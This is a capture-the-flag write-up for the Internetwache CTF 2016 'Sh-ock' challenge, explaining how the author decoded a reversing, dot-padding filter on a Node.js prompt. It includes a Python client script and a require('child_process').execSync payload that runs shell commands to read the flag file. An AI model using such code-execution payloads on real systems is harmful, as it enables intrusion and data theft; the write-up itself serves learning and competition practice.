+++
author = "arturo182"
categories = [ "writeups" ]
date = "2016-02-21T14:40:00+01:00"
title = "Internetwache CTF 2016 Sh-ock (Exp 90) Writeup"
+++

# Problem

>  This is some kind of weird thing. I am sh-ocked.

Service: 188.166.133.53:12589

Solved by 105 teams

# Solution

We nc to the service and are presented with a prompt:

~~~none
Welcome and have fun!
$
~~~

Let's try something basic:

~~~none
Welcome and have fun!
$help
[ReferenceError: lh is not defined]
$
~~~

Right off the bat, that tells us a few things, the `ReferenceError` tells us that this is JavaScript (nodejs). The `lh` part is a little more confusing, let's try something else:

~~~none
$this
[ReferenceError: it is not defined]
$
~~~

Ok, so for help we got lh and for this we got it, seems like 3rd and 1st character, should we pad our commands?

~~~none
$t.h.i.s.
[ReferenceError: siht is not defined]
$
~~~

Yes, that seems to almost work, however it seems that the command is not only padded, but also reversed, how about:

~~~none
$s.i.h.t.
Interface {
  _sawReturn: false,
  domain: null,
...snip...
  _decoder: 
   { encoding: 'utf8',
     surrogateSize: 3,
     charBuffer: <Buffer 65 6e 74 73 20 3d>,
     charReceived: 0,
     charLength: 0 },
  _line_buffer: '' }
$
~~~

There we go! So now we know what to do (or so we think), let's get this party started.

~~~none
$e.r.i.u.q.e.r.
[SyntaxError: Unexpected token .]
$
~~~

But... but... we were so sure that we figured it out! Needs more testing I guess.

~~~none
$1.2.3.4.5.
54321
$1.2.3.4.5.6.
[SyntaxError: Unexpected number]
$1..2..3..4..5..6..
654321
$1...2...3...4...5...6...7...
7654321
$
~~~

So, 1 dot padding for strings shorter than 6 and 2 dots for 7 and so on... To the [python-cave](https://www.youtube.com/watch?v=Yic7IRO9d6I)!

After some trial and error, this is what we end up with:
~~~python
import socket
from sys import stdin, stdout

# source: https://gist.github.com/leonjza/f35a7252babdf77c8421
class Netcat:
    def __init__(self, ip, port):
        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):
        return self.socket.recv(length)

    def read_until(self, data):
        while not data in self.buff:
            self.buff += self.socket.recv(1024)

		pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
        return rval

    def write(self, data):
        self.socket.send(data)

    def close(self):
        self.socket.close()

nc = Netcat('188.166.133.53', 12589)
while 1:
    print nc.read_until('$'),

    inp = stdin.readline().replace('\n', '')
    dots = min(max(1, len(inp)-4), 5) * '.'
    nc.write(dots.join(i for i in inp)[::-1] + dots + '\n')

s.close()
~~~

With that script, we have automatic padding and reversing, so we can execute commands easily:
~~~none
Welcome and have fun!
$require('child_process').execSync('cat flag.txt').toString('ascii')
 IW{Shocked-for-nothing!}
$
~~~

Flag: IW{Shocked-for-nothing!}

Sidenote: On our way out we also managed to snatch the source of the server task and I think it's interesting to see the exact impementation of the padding, to confirm that our python code was valid:

~~~javascript
    if(line.length <= 10) {
        line = line.replace(/.(.)?/g, '$1');
    } else if(line.length <= 20) {
        line = line.replace(/..(.)?/g, '$1');
    } else if(line.length <= 30) {
        line = line.replace(/...(.)?/g, '$1');
    } else if(line.length <= 40) {
        line = line.replace(/....(.)?/g, '$1');
    } else {
        line = line.replace(/.....(.)?/g, '$1');
    }
~~~